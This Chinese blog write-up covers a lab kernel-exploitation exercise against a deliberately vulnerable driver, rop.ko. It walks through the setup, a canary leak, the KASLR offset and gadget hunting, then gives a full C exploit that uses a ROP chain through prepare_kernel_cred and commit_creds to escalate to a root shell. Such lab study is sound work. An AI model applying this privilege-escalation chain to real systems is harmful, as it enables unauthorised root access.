<h4 id="kernel2user"><a href="#kernel2user" class="headerlink" title="kernel2user"></a>kernel2user</h4><p>1.swapgs恢复GS<br>2.iretq（加上寄存器信息）或sysretq</p>
<h1 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h1><ul>
<li><ol>
<li>boot.sh: 内核启动脚本<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 <span class="string">\</span>        <span class="string">"默认使用qemu启动"</span></span><br><span class="line">-kernel bzImage <span class="string">\</span>           <span class="string">"Linux内核镜像文件"</span></span><br><span class="line">-initrd rootfs.img <span class="string">\</span>        <span class="string">"打包后的文件系统"</span></span><br><span class="line">-append <span class="string">"console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet"</span> <span class="string">\</span>        <span class="string">"启动界面为终端、内存文件系统RamDisk、"</span></span><br><span class="line">-cpu qemu64,+smep,+smap <span class="string">\</span>   <span class="string">"开启了smap、smep机制，这意味着，内核态里面不能直接访问用户态的数据，而应该拷贝到内核的空间；内核态不能执行用户空间的代码，否则会触发页错误"</span></span><br><span class="line">-nographic <span class="string">\</span>                <span class="string">"非图形界面"</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>2.bzImage：Linux内核镜像文件</p>
</li>
<li><p>3.rootfs.img: 打包后的文件系统</p>
</li>
<li><p>4.rop.ko:有漏洞的驱动文件</p>
</li>
<li><p>5.vmlinux: vmlinux是未压缩的内核，vmlinux 是ELF文件，即编译出来的最原始的文件。用于kernel-debug，产生system.map符号表，不能用于直接加载，不可以作为启动内核。只是启动过程中的中间媒体</p>
</li>
</ul>
<p><em>相关选项：</em></p>
<figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-<span class="ruby">cpu kvm64,+smep,+smap 设置 CPU的安全选项， 这里开启了 smap 和 smep</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">-kernel 设置内核 bzImage 文件的路径</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">-initrd 设置（利用 busybox 创建的 ）rootfs.img ，作为内核启动的文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">-gdb tcp::<span class="number">1234</span> 设置 gdb 的调试端口 为 <span class="number">1234</span></span></span><br></pre></td></tr></table></figure>
<h1 id="启动之前"><a href="#启动之前" class="headerlink" title="启动之前"></a>启动之前</h1><h2 id="首先要对打包后的文件系统进行处理解包"><a href="#首先要对打包后的文件系统进行处理解包" class="headerlink" title="首先要对打包后的文件系统进行处理解包"></a>首先要对打包后的文件系统进行处理解包</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cp</span> <span class="string">rootfs.img rootfs.cpio</span></span><br><span class="line"><span class="attr">mkdir</span> <span class="string">core</span></span><br><span class="line"><span class="attr">cd</span> <span class="string">core</span></span><br><span class="line"><span class="attr">mv</span> <span class="string">../rootfs.cpio ./</span></span><br><span class="line"><span class="attr">cpio</span> <span class="string">-idmv &lt; rootfs.cpio</span></span><br></pre></td></tr></table></figure>
<p>现在在文件夹目录下有一个core目录，里面就是文件系统了。效果如下<img src="https://s1.ax1x.com/2020/07/12/U3wLo8.png" alt="">这里要注意一下<code>gen.sh</code>他是用来打包文件系统的脚本并生成<code>rootfs.img</code>如下：<code>find .| cpio -o --format=newc &gt; ../rootfs.img</code></p>
<h2 id="查看开机自启动脚本-core-etc-init-d"><a href="#查看开机自启动脚本-core-etc-init-d" class="headerlink" title="查看开机自启动脚本 core/etc/init.d"></a>查看开机自启动脚本 core/etc/init.d</h2><pre><code>#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys

echo /sbin/mdev &gt; /proc/sys/kernel/hotplug
/sbin/mdev -s

insmod /home/pwn/rop.ko

chmod -R 111 /bin
chmod -R 111 /usr/bin
chmod -R 111 /sbin
cat /proc/kallsyms &gt; /tmp/kallsyms  # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录
chmod 666 /tmp/kallsyms

chown -R 1000:1000 /home/pwn

chown 0:0 /flag
chmod 700 /flag

chmod 666 /dev/rop_dev

cd /home/pwn
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0 -f</code></pre><p>这里把/proc/kallsyms拷贝到/tmp/kallsyms里，并且设置了sid和uidgid，明显不是root用户的。<br><a href="https://blog.csdn.net/hunanchenxingyu/article/details/8467606" target="_blank" rel="noopener">/proc/kallsyms与内核符号相关</a></p>
<h2 id="rop-ko文件"><a href="#rop-ko文件" class="headerlink" title="rop.ko文件"></a>rop.ko文件</h2><ul>
<li>dangerous函数  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">dangerous</span><span class="params">(<span class="keyword">size_t</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">overflow</span>[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">*(_QWORD *)<span class="built_in">overflow</span> = <span class="number">0L</span>L;</span><br><span class="line">*(_QWORD *)&amp;<span class="built_in">overflow</span>[<span class="number">8</span>] = <span class="number">0L</span>L;</span><br><span class="line">printk(&amp;unk_37F, v2);   <span class="comment">// 打出canary</span></span><br><span class="line"><span class="built_in">memcpy</span>(<span class="built_in">overflow</span>, kernel_buf, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="ROP链构造"><a href="#ROP链构造" class="headerlink" title="ROP链构造"></a>ROP链构造</h1><h2 id="查看kaslr与基地址偏移"><a href="#查看kaslr与基地址偏移" class="headerlink" title="查看kaslr与基地址偏移"></a>查看kaslr与基地址偏移</h2><p>1.启动起来后执行<code>cat /tmp/kallsyms | grep startup_64</code>得到：<code>ffffffff89e00000 T startup_64</code><br>若此时startup_64不为0xffffffff81000000则差值就是内核基地址的加载偏移<br>2.得到<code>prepare_kernel_cred</code>地址<code>ffffffff89e834b0 T prepare_kernel_cred</code><br>3.得到<code>commit_creds</code>地址<code>ffffffff89e83190 T commit_creds</code></p>
<h2 id="用户态与内核态的切换"><a href="#用户态与内核态的切换" class="headerlink" title="用户态与内核态的切换"></a>用户态与内核态的切换</h2><p>进入内核前保存用户态数据:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;  <span class="comment">//保存用户态寄存器状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="内核态返回用户态："><a href="#内核态返回用户态：" class="headerlink" title="内核态返回用户态："></a>内核态返回用户态：</h3><ul>
<li><p><code>swapgs</code>指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。</p>
</li>
<li><p><code>iretq</code>的堆栈布局如下</p>
  <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> RIP                  </span>|<span class="string">&lt;== low mem</span></span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> CS                   </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> EFLAGS               </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> RSP                  </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> SS                   </span>|<span class="string">&lt;== high mem</span></span><br><span class="line">|<span class="string">----------------------</span>|</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>新的用户空间指令指针(RIP)，用户空间堆栈指针(RSP)，代码和堆栈段选择器(CS和SS)以及具有各种状态信息的EFLAGS寄存器。</p>
<h2 id="ROPgadget-这里真的找了半天"><a href="#ROPgadget-这里真的找了半天" class="headerlink" title="ROPgadget(这里真的找了半天)"></a>ROPgadget(这里真的找了半天)</h2><ul>
<li><code>ROPgadget --binary vmlinux &gt; rop_gadget</code>查找vmlinux的ropgadget</li>
<li><code>objdump -d vmlinux -M intel | grep -E &#39;mov rdi|rax&#39; &gt; gadget</code>或者直接dump出来，这样比较多</li>
<li>之前找了一条gadget<code>0xffffffff810f1243 : mov rdi, rax ; test rax, rax ; jne 0xffffffff810f1220 ; ret</code><br>结果发现根本不能用，原因在于rax此时是指向新cred的指针（必不为零）test之后zf=0，jne一定会跳转，ret回不来。</li>
<li>最后找到<code>0xffffffff810f1243 : mov rdi, rax ; test rax, rax ; jne 0xffffffff810f1220 ; ret</code>然后补一条<code>0xffffffff8101647d : test al, 1 ; ret</code></li>
</ul>
<p><strong>最终rop布置</strong><br> <figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> pop rdi; ret         </span>|<span class="string">&lt;== low mem</span></span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> NULL                 </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> addr of              </span>|</span><br><span class="line">|<span class="string"> prepare_kernel_cred()</span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> test al, 1 ; ret     </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string">mov rdi, rax          </span>|</span><br><span class="line">|<span class="string">test rax, rax         </span>|<span class="string"> </span></span><br><span class="line">|<span class="string">jne 0xffffffff810f1220</span>|</span><br><span class="line">|<span class="string">   ret                </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> addr of              </span>|</span><br><span class="line">|<span class="string"> commit_creds()       </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> swapgs;              </span>|</span><br><span class="line">|<span class="string"> pop rbp; ret         </span>|</span><br><span class="line">|<span class="string">----------------------</span>|<span class="string">  </span></span><br><span class="line">|<span class="string"> NULL                 </span>|</span><br><span class="line">|<span class="string">----------------------</span>|<span class="string">      </span></span><br><span class="line">|<span class="string"> iretq;               </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> shell                </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> user_CS              </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> user_EFLAGS          </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> user_RSP             </span>|</span><br><span class="line">|<span class="string">----------------------</span>|</span><br><span class="line">|<span class="string"> user_SS              </span>|<span class="string">&lt;== high mem</span></span><br><span class="line">|<span class="string">----------------------</span>|</span><br></pre></td></tr></table></figure></p>
<h2 id="查找iretq"><a href="#查找iretq" class="headerlink" title="查找iretq"></a>查找iretq</h2><p>发现ROPgadget中找不到iretq<br>在这里直接去搜索<code>48 CF</code>找到iretq<br>opt+B<br><img src="https://s1.ax1x.com/2020/07/13/UJu4ds.png" alt=""></p>
<h2 id="自己写了一个小sh文件"><a href="#自己写了一个小sh文件" class="headerlink" title="自己写了一个小sh文件"></a>自己写了一个小sh文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -masm=intel -static -o exp &amp;&amp;</span><br><span class="line">cp exp ./core/home/pwn/ &amp;&amp;</span><br><span class="line"><span class="built_in">cd</span> core/    &amp;&amp;</span><br><span class="line">sh gen.sh &amp;&amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"success!"</span> &amp;&amp;</span><br><span class="line"><span class="built_in">cd</span> ../ &amp;&amp;</span><br><span class="line">sh boot.sh</span><br></pre></td></tr></table></figure>


<p>注意这里一定要做静态编译，因为内核中没有glibc这些玩意。</p>
<h2 id="向驱动中的函数下断点"><a href="#向驱动中的函数下断点" class="headerlink" title="向驱动中的函数下断点"></a>向驱动中的函数下断点</h2><ul>
<li>vmlinux本身是去掉符号表的，但我们想断在驱动中的函数。<code>cat /proc/modules | grep rop</code>拿到相关地址</li>
<li>也可通过<code>lsmod</code>或<code>cat /sys/module/rop/section/.text</code></li>
<li>得到<code>rop 16384 0 - Live 0x12345</code><br>然后在gdb窗口中：<code>add-symbol-file ./rop.ko 0x12345</code><br>接下来就可以直接断在驱动中的函数里了。</li>
</ul>
<p><strong>但是经过我实际测试，这三个应该效果是一样的，但你必须修改rcS启动脚本以root启动，才能看到真正的地址要不然就是0x000000000</strong><br>效果如下：<br><img src="https://s1.ax1x.com/2020/07/13/UtMVu8.png" alt=""></p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 256</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;  <span class="comment">//保存用户态寄存器状态</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"root"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_addr</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmd[N];</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">size_t</span> info;</span><br><span class="line">    <span class="built_in">memset</span>(cmd,<span class="number">0</span>,<span class="number">256</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,<span class="string">"cat /tmp/kallsyms | grep "</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,name);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,<span class="string">" &gt;"</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,<span class="string">" "</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,name);</span><br><span class="line">    <span class="comment">//printf("execute: %s\n",cmd);</span></span><br><span class="line">    system(cmd);</span><br><span class="line"></span><br><span class="line">    f = fopen(name,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!f)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fopen error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(f,<span class="string">"%lx"</span>,&amp;info);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s : %lx\n"</span>,name,info);</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_canary</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">size_t</span> info;</span><br><span class="line">    <span class="keyword">char</span> *name = <span class="string">"canary"</span>;</span><br><span class="line">    system(<span class="string">"dmesg | grep canary &gt; canary"</span>);</span><br><span class="line">    f = fopen(name,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!f)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"fopen error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(f,<span class="built_in">strlen</span>(<span class="string">"[   32.050924] canary is "</span>),SEEK_SET);</span><br><span class="line">    <span class="built_in">fscanf</span>(f,<span class="string">"%lx"</span>,&amp;info);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s : %lx\n"</span>,name,info);</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> info;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">rop</span><span class="params">(<span class="keyword">size_t</span> *rop,<span class="keyword">size_t</span> offset,<span class="keyword">size_t</span> prepare_kernel_cred,<span class="keyword">size_t</span> commit_creds)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810013a8</span> + offset; <span class="comment">//pop rdi;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101647d</span> + offset; <span class="comment">// 0xffffffff8101647d : test al, 1 ; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8138e454</span> + offset; <span class="comment">// 0xffffffff810f1243 : mov rdi, rax ; test rax, rax ; jne 0xffffffff810f1220 ; ret</span></span><br><span class="line">    <span class="comment">//A pointer to the new cred struct will be stored in %rax which can then be moved to %rdi again and passed as the first argument to commit_creds(). </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81c00d5a</span> + offset; <span class="comment">// swapgs ; popfq ; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0x0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021d02</span> + offset; <span class="comment">// iretq</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)shell;               <span class="comment">//rip </span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> startup_64,prepare_kernel_cred,commit_creds,offset,canary;</span><br><span class="line">    save_status();</span><br><span class="line">    startup_64 = get_addr(<span class="string">"startup_64"</span>);</span><br><span class="line">    prepare_kernel_cred = get_addr(<span class="string">"prepare_kernel_cred"</span>);</span><br><span class="line">    commit_creds = get_addr(<span class="string">"commit_creds"</span>);</span><br><span class="line">    offset = startup_64 - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"offset : %lx\n"</span>,offset);</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/rop_dev"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"open error!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> payload[<span class="number">0x10</span>] = &#123;<span class="number">0x1</span>&#125;;</span><br><span class="line">    <span class="built_in">write</span>(fd,payload,<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,payload,<span class="number">0x10</span>); <span class="comment">//双写打出canary(缓冲区)</span></span><br><span class="line">    canary = get_canary();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size_t : %ld\n"</span>,<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> payload2[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    payload2[<span class="number">0</span>] = <span class="number">0x6161616161616161</span>;</span><br><span class="line">    payload2[<span class="number">1</span>] = <span class="number">0x6161616161616161</span>; <span class="comment">// 0x10</span></span><br><span class="line">    payload2[<span class="number">2</span>] = canary;</span><br><span class="line">    save_status();</span><br><span class="line">    rop(&amp;payload2[<span class="number">3</span>],offset,prepare_kernel_cred,commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"start to pwn &gt;\n"</span>);</span><br><span class="line">    <span class="built_in">write</span>(fd,payload2,<span class="number">17</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"over!\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：<img src="https://s1.ax1x.com/2020/07/14/UNFQk6.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/u013686019/article/details/26846571/" target="_blank" rel="noopener">https://blog.csdn.net/u013686019/article/details/26846571/</a><br><a href="https://www.anquanke.com/post/id/172216" target="_blank" rel="noopener">https://www.anquanke.com/post/id/172216</a><br><a href="https://www.povcfe.site/2020/05/16/kernel-rop/" target="_blank" rel="noopener">https://www.povcfe.site/2020/05/16/kernel-rop/</a><br><a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a><br><a href="https://xz.aliyun.com/t/2054?accounttraceid=913e28d0aee642b792d6762fbc95e68ahnaw" target="_blank" rel="noopener">https://xz.aliyun.com/t/2054?accounttraceid=913e28d0aee642b792d6762fbc95e68ahnaw</a><br><a href="https://blog.csdn.net/airuozhaoyang/article/details/99300030?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159469532719725222424732%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=159469532719725222424732&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v3-1-99300030.pc_ecpm_v3_pc_rank_v3&utm_term=SMEP%E4%BF%9D%E6%8A%A4" target="_blank" rel="noopener">安全防护机制</a><br><a href="https://bbs.pediy.com/thread-226696.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226696.htm</a></p>
